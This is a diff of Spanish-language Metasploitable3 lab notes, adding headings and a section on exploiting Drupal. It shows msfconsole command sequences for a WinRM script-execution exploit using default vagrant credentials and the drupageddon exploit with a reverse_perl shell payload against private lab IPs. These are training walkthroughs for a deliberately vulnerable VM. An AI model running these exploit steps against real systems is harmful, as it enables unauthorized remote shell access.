@@ -1,8 +1,9 @@
-## Vulnerabilidades Metasploitable3
+# Vulnerabilidades Metasploitable3
 Metasploitable3 es una máquina virtual que contiene desde su creación vulnerabilidades a propósito, con el fin de que sirva como un campo de pruebas para aquellos que quieran hacer pentesting, es decir, probar a explotar la máquina mediante uno de estos vectores.
 
 Metasploitable3 viene con dos máquina virtuales, Windows Server 2008 y Ubuntu 14.04 (sin GUI).
 
+## Windows Server 2008
 ### psexec
 Psexec es una herramienta de Windows que sirve de reemplazo ligero a telnet, permitiendo ejecutar procesos en otros sistemas, completando la interactividad completa para las aplicaciones de consola sin tener que instalar manualmente el software cliente.
 
@@ -36,7 +37,7 @@ WinRM es un protocolo de Microsoft que permite acceder o intercambiar informaci�
 
 En Windows Server 2008 existe una vulnerabilidad en la que, si conocemos las credenciales de un usuario o las crackeamos, podemos manipular la máquina de forma remota con utilidades como Meterpreter. Si el servicio de WinRM se encuentra activo, podemos hacer uso de `exploits/windows/winrm/winrm_script_exec` para aprovecharnos.
 
-Los pasos para realizar el script son los siguientes:
+Los pasos para realizar el exploit son los siguientes:
 
 ```
 msf exploit(handler) > use exploit/windows/winrm/winrm_script_exec
@@ -53,3 +54,26 @@ msf exploit(winrm_script_exec) > exploit
 El proceso es el siguiente:  Abrimos la terminal de metasploit, y seleccionamos `exploit/windows/winrm/winrm_script_exec` mediante el comando `use`. Posteriormente seleccionamos a qué IP queremos dirigir el ataque, en este caso a la `192.168.1.129`. Luego seleccionamos el usuario y contraseña con la cual haremos posible el exploit, en este caso `vagrant` y 'vagrant'. Por último, ejecutaremos `exploit` para proceder.
 
 Al igual que antes, meterpreter será la payload por defecto. Si queremos cambiarla, podemos hacer uso del comando `show payloads` para ver todos los payloads disponibles, y luego el comando `use payload [PAYLOAD A USAR]` para seleccionarlo.
+
+## Ubuntu 14.04
+### Drupal HTTP
+Drupal es una aplicación gratuita y de código abierto que puede ser usado para crear y gestion contenido en páginas webs, parecido a otras aplicaciones como Wordpress. Se caracteriza por ser versátil y estar centrada en desarrolladores y en ofrecer más opciones de personalización.
+
+En esta versión de Ubuntu y Drupal, existe una vulnerabilidad que permite acceder como usuario de forma remota a la terminal del sistema Linux, tan solo con conocer la IP del dispositivo y sin tener que conocer usuarios ni sistemas. Para usar el exploit, tan solo es necesario (a parte de la IP) conocer/intuir dónde se encuentra el directorio `drupal/`.
+
+Los pasos para realizar el exploit son los siguientes:
+
+```
+msf > use exploit/multi/http/drupal_drupageddon
+msf exploit(multi/http/drupal_drupageddon) > set rhost 192.168.1.136
+rhost => 192.168.1.136
+msf exploit(multi/http/drupal_drupageddon) > set targeturi /drupal/
+targeturi => /drupal/
+msf exploit(multi/http/drupal_drupageddon) > set payload php/reverse_perl
+payload => php/reverse_perl
+msf exploit(multi/http/drupal_drupageddon) > exploit
+```
+
+El proceso es el siguiente:  Abrimos la terminal de metasploit, y seleccionamos `exploit/multi/http/drupal_drupageddon` mediante el comando `use`. Seleccionamos la IP del dispositivo con el que vamos a hacer pentesting, en este caso `192.168.1.136`. Luego, al atributo `targeturi` le asigno el directorio `drupal/`, para posteriormente asignar la payload `php/reverse_perl`. Esto último es opcional, ya que por defecto se selecciona automáticamente el programa meterpreter en su versión de PHP, pero escogemos este otro payload que permite conectarnos directamente a la consola. Por último usamos `exploit` para iniciar el ataque.
+
+Al ejecutarlo, si sale bien estaremos en la consola de Ubuntu de forma remota como si fuera una shell normal, estando probablemente logueados como el usuario `www-data`.
